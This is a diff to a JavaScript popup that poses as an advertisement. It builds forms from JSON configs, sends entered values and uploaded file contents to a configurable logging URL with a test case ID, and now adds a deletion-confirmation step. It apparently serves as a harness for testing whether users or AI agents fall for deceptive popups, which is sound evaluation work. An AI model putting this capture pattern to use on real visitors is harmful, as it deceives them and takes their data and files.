@@ -1,222 +1,204 @@
 document.addEventListener("DOMContentLoaded", async () => {
-  const advertisement = document.getElementById("advertisement");
-  const backgroundImage = document.getElementById("brand-screenshot");
+  const ad = document.getElementById("advertisement");
+  const bg = document.getElementById("brand-screenshot");
   const closeBtn = document.getElementById("close-popup");
   const form = document.getElementById("ad-form");
-  const titleElement = document.getElementById("form-title");
-  const descriptionElement = document.getElementById("form-description");
+  const titleEl = document.getElementById("form-title");
+  const descEl  = document.getElementById("form-description");
 
-  let redirectUrl = "https://www.example.com";
-  let sheetUrl = "";
-  let testCaseId = "";
-  let isUploadMode = false;
-  let isDownloadMode = false;
-  let downloadData = null;
-  let successMessage = "Submitted successfully.";
-  let failureMessage = "Failed to submit form.";
+  // New deletion-confirmation elements
+  const deletePanel     = document.getElementById("delete-confirmation");
+  const confirmCheckbox = document.getElementById("confirm-deletion");
+  const okButton        = document.getElementById("deletion-ok");
 
+  let redirectUrl      = "https://www.example.com";
+  let sheetUrl         = "";
+  let testCaseId       = "";
+  let isUploadMode     = false;
+  let isDownloadMode   = false;
+  let downloadData     = null;
+  let successMessage   = "Submitted successfully.";
+  let failureMessage   = "Failed to submit form.";
+  let requireDeletion  = false;  // <-- new flag
 
-  advertisement.classList.remove("hidden");
-  backgroundImage.style.opacity = "0.02";
-
+  // show popup
+  ad.classList.remove("hidden");
+  bg.style.opacity = "0.02";
   closeBtn.addEventListener("click", () => {
-    advertisement.classList.add("hidden");
-    backgroundImage.style.opacity = "1";
+    ad.classList.add("hidden");
+    bg.style.opacity = "1";
   });
 
-  function getFormConfigFilename() {
+  function getConfigFilename() {
     const params = new URLSearchParams(window.location.search);
-    const id = params.get("id");
-    return id ? `${id}.json` : "default.json";
+    return params.get("id") ? `${params.get("id")}.json` : "default.json";
   }
 
-  async function loadFormFromJSON(jsonFilename) {
+  async function loadConfig(fn) {
     form.innerHTML = "";
-
     try {
-      const response = await fetch(jsonFilename);
-      const config = await response.json();
+      const resp = await fetch(fn);
+      const cfg  = await resp.json();
 
-      document.title = config.title || "Untitled Form";
-      titleElement.textContent = config.title || "Untitled Form";
-      descriptionElement.textContent = config.description || "";
+      // core props
+      document.title      = cfg.title || "";
+      titleEl.textContent = cfg.title || "";
+      descEl.textContent  = cfg.description || "";
+      if (cfg.backgroundImage) bg.src = cfg.backgroundImage;
+      if (cfg.redirectUrl)      redirectUrl = cfg.redirectUrl;
+      if (cfg.sheetUrl)         sheetUrl    = cfg.sheetUrl;
+      if (cfg.test_case_id)     testCaseId  = cfg.test_case_id;
+      if (cfg.successMessage)   successMessage = cfg.successMessage;
+      if (cfg.failureMessage)   failureMessage = cfg.failureMessage;
+      if (cfg.requireDeletion)  requireDeletion = true;
 
-      if (config.backgroundImage) backgroundImage.src = config.backgroundImage;
-      if (config.redirectUrl) redirectUrl = config.redirectUrl;
-      if (config.sheetUrl) sheetUrl = config.sheetUrl;
-      if (config.test_case_id) testCaseId = config.test_case_id;
-      if (config.successMessage) successMessage = config.successMessage;
-      if (config.failureMessage) failureMessage = config.failureMessage;
-
-
-      if (
-        Array.isArray(config.fields) &&
-        config.fields.length === 1 &&
-        config.fields[0].type === "file"
-      ) {
-        isUploadMode = true;
-      }
-
-      if (config.download && config.download.url) {
+      // detect mode
+      if (cfg.download?.url) {
         isDownloadMode = true;
-        downloadData = config.download;
+        downloadData   = cfg.download;
+      } else if (Array.isArray(cfg.fields)) {
+        if (cfg.fields.length === 1 && cfg.fields[0].type === "file") {
+          isUploadMode = true;
+        }
+        // render inputs
+        cfg.fields.forEach(f => {
+          const lbl = document.createElement("label");
+          lbl.htmlFor = f.id; lbl.textContent = f.label;
+          const inp = document.createElement("input");
+          inp.type = f.type || "text";
+          inp.id   = f.id; inp.name = f.name;
+          if (f.required) inp.required = true;
+          form.append(lbl, inp);
+        });
+        const btn = document.createElement("button");
+        btn.type = "submit";
+        btn.textContent = isUploadMode ? "Upload" : "Submit";
+        form.appendChild(btn);
       }
 
-      // Render form or download button
+      // download mode button
       if (isDownloadMode) {
-        const downloadButton = document.createElement("button");
-        downloadButton.type = "submit";
-        downloadButton.textContent = "Download File";
-        form.appendChild(downloadButton);
-      } else if (Array.isArray(config.fields)) {
-        config.fields.forEach((field) => {
-          const label = document.createElement("label");
-          label.setAttribute("for", field.id);
-          label.textContent = field.label;
-
-          const input = document.createElement("input");
-          input.type = field.type || "text";
-          input.id = field.id;
-          input.name = field.name;
-          if (field.required) input.required = true;
-
-          form.appendChild(label);
-          form.appendChild(input);
-        });
-
-        const submitButton = document.createElement("button");
-        submitButton.type = "submit";
-        submitButton.textContent = isUploadMode ? "Upload" : "Submit";
-        form.appendChild(submitButton);
+        const btn = document.createElement("button");
+        btn.type = "submit";
+        btn.textContent = "Download File";
+        form.appendChild(btn);
       }
 
     } catch (err) {
-      titleElement.textContent = "Error";
-      descriptionElement.textContent = `Unable to load form config from "${jsonFilename}"`;
-      console.error("Failed to load form config:", err);
+      titleEl.textContent = "Error";
+      descEl.textContent  = `Could not load ${fn}`;
+      console.error(err);
     }
   }
 
-  form.addEventListener("submit", async (e) => {
-    e.preventDefault();
+  // deletion‑confirmation logic
+  confirmCheckbox.addEventListener("change", () => {
+    okButton.disabled = !confirmCheckbox.checked;
+  });
+  okButton.addEventListener("click", () => {
+    window.location.href = redirectUrl;
+  });
 
-    // DOWNLOAD MODE
-    if (isDownloadMode) {
-      const payload = {
-        test_case_id: testCaseId,
-        first_infor: "",
-        second_infor: "",
-        filename: downloadData.filename || "",
-        mimetype: downloadData.mimetype || ""
-      };
+  form.addEventListener("submit", async ev => {
+    ev.preventDefault();
 
+    // helper to show deletion panel
+    function promptDeletion() {
+      form.classList.add("hidden");
+      deletePanel.classList.remove("hidden");
+    }
+
+    // RECORD & ACT
+    const sendLog = async payload => {
       try {
         await fetch(sheetUrl, {
           method: "POST",
           mode: "no-cors",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-      } catch (err) {
-        console.error("Failed to log download:", err);
+      } catch (e) {
+        console.error("Logging failed:", e);
       }
+    };
 
+    // DOWNLOAD
+    if (isDownloadMode) {
+      await sendLog({
+        test_case_id: testCaseId,
+        first_infor:  "",
+        second_infor: "",
+        filename:     downloadData.filename || "",
+        mimetype:     downloadData.mimetype || ""
+      });
       try {
-        const fileResponse = await fetch(downloadData.url);
-        const blob = await fileResponse.blob();
-        const blobUrl = URL.createObjectURL(blob);
-      
-        const link = document.createElement("a");
-        link.href = blobUrl;
-        link.download = downloadData.filename || "downloaded_file";
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      
-        URL.revokeObjectURL(blobUrl); // clean up
-        alert(successMessage);
-      } catch (error) {
-        console.error("Failed to download file:", error);
+        const r = await fetch(downloadData.url);
+        const blob = await r.blob();
+        const u = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = u; a.download = downloadData.filename || "file";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(u);
+      } catch (e) {
+        console.error("Download error:", e);
       }
-      
 
-      window.location.href = redirectUrl;
+      if (requireDeletion) {
+        promptDeletion();
+      } else {
+        alert(successMessage);
+        window.location.href = redirectUrl;
+      }
       return;
     }
 
-    // UPLOAD MODE
+    // UPLOAD
     if (isUploadMode) {
       const fileInput = form.querySelector('input[type="file"]');
       const file = fileInput?.files?.[0];
-      if (!file) return alert("Please select a file to upload.");
-
+      if (!file) return alert("Please select a file.");
       const reader = new FileReader();
       reader.onload = async () => {
-        const base64Content = reader.result.split(",")[1];
-
-        const payload = {
+        const content = reader.result.split(",")[1];
+        await sendLog({
           test_case_id: testCaseId,
-          first_infor: "",
+          first_infor:  "",
           second_infor: "",
-          filename: file.name,
-          mimetype: file.type,
-          content: base64Content
-        };
-
-        try {
-          await fetch(sheetUrl, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          });
+          filename:     file.name,
+          mimetype:     file.type,
+          content
+        });
+        if (requireDeletion) {
+          promptDeletion();
+        } else {
           alert(successMessage);
-        } catch (err) {
-          console.error("Upload failed:", err);
-          alert(failureMessage);
+          window.location.href = redirectUrl;
         }
-
-        window.location.href = redirectUrl;
       };
-
       reader.readAsDataURL(file);
       return;
     }
 
-    // FORM MODE
-    const data = {};
-    Array.from(form.elements).forEach((el) => {
-      if (el.name) {
-        data[el.name] = el.value.trim();
-      }
-    });
-
+    // GENERIC FORM
+    const data = Array.from(form.elements)
+      .filter(el => el.name)
+      .reduce((o, el) => (o[el.name] = el.value.trim(), o), {});
     data.test_case_id = testCaseId;
-    data.filename = "";
-    data.mimetype = "";
+    data.filename     = "";
+    data.mimetype     = "";
+    await sendLog(data);
 
-    try {
-      await fetch(sheetUrl, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      });
+    if (requireDeletion) {
+      promptDeletion();
+    } else {
       alert(successMessage);
-    } catch (err) {
-      console.error("Submit error:", err);
-      alert(failureMessage);
+      window.location.href = redirectUrl;
     }
-
-    window.location.href = redirectUrl;
   });
 
-  const jsonFile = getFormConfigFilename();
-  await loadFormFromJSON(jsonFile);
+  // kick off
+  const cfgFile = getConfigFilename();
+  await loadConfig(cfgFile);
 });
